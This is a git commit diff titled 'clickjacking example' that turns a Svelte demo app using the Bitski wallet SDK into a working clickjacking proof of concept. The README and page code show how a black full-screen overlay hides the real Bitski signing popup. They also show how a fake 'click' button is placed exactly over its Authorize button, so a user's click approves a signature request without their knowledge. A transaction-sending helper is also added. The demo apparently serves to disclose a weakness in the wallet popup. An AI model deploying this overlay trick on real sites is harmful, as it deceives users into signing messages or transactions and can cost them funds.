32678129dcd66234d3b7974120197d1740cb94b5
wighawag <wighawag@gmail.com>
2024-02-24 17:40:46 +0000

    clickjacking example

--- README.md
+++ README.md
@@ -3,9 +3,12 @@
 ```bash
 pnpm i
 pnpm dev
-# - then navigate to localhost:5173
+# - then navigate to localhost:5173/click
 # - click connect
-# - click sign
-# - close the popup
-# see that the line `console.log({ signature });` never get called
+# after you are connect you will a black screen and a button will popup soon after
+# behind the scene the app has send a request to bitski provider to sign a message
+# the bitski popup is actually there hidden under the black background
+# the click button shown is actualy a fake button placed exactly where the bitskip Authorize button is and upon clicking in the button area
+# the Authorize button will   clicked instead
+# in the console you sould see the resulting signature
 ```
--- src/routes/+page.svelte
+++ src/routes/+page.svelte
@@ -2,6 +2,8 @@
 	import { Bitski, AuthenticationStatus } from 'bitski';
 	import type { EIP1193ProviderWithoutEvents } from 'eip-1193';
 	import { onMount } from 'svelte';
+	import Portal from 'svelte-portal';
+
 	const bitski = new Bitski(
 		'9a75db9c-aa11-4151-bf02-5018eb51c9bc',
 		'http://localhost:5174/bitski.html'
@@ -9,12 +11,16 @@
 
 	let provider: EIP1193ProviderWithoutEvents | undefined;
 	let account: `0x${string}` | undefined;
+	let showFakeButton = false;
 
 	async function onConnected() {
 		provider = bitski.getProvider() as EIP1193ProviderWithoutEvents;
 		const accounts = await provider.request({ method: 'eth_requestAccounts' });
 		account = accounts[0];
 		console.log({ account });
+
+		setTimeout(() => (showFakeButton = true), 800);
+		await signMessage();
 	}
 
 	onMount(async () => {
@@ -69,11 +75,80 @@
 			console.error(`no provider`);
 		}
 	}
+
+	async function sendTransaction() {
+		if (provider) {
+			if (account) {
+				const signature = await provider.request({
+					method: 'eth_sendTransaction',
+					params: [{ from: account, to: account, value: '0x0' }]
+				});
+				console.log({ signature });
+			} else {
+				console.error(`no account`);
+			}
+		} else {
+			console.error(`no provider`);
+		}
+	}
 </script>
 
 {#if !provider}
 	<button on:click={() => connect()}>Connect</button>
 {:else}
-	<button on:click={() => signMessage()}>sign</button>
+	<Portal target="body">
+		<div class="cover">
+			{#if showFakeButton}
+				<div class="fake-popup"><button class="fake-button">click</button></div>
+			{/if}
+		</div>
+	</Portal>
 	<button on:click={() => disconnect()}>Disconnect</button>
 {/if}
+
+<style>
+	.cover {
+		z-index: 1001;
+		position: fixed;
+		inset: 0;
+		width: 100%;
+		height: 100%;
+		background-color: black;
+		/* opacity: 0.6; */
+		pointer-events: none;
+		display: flex;
+		align-items: center;
+		justify-content: center;
+	}
+
+	.fake-popup {
+		width: 400px;
+		height: 420px;
+		display: flex;
+		align-items: end;
+		justify-content: center;
+		padding-bottom: 48px;
+	}
+
+	.fake-button {
+		width: 352px;
+		height: 44px;
+		border-radius: 9999px;
+		/* position: ; */
+	}
+
+	@media (max-width: 600px) {
+		.cover {
+			align-items: end;
+		}
+
+		.fake-popup {
+			padding-bottom: 24px;
+			width: 100%;
+		}
+
+		.fake-button {
+			width: 90%;
+		}
+	}
+</style>
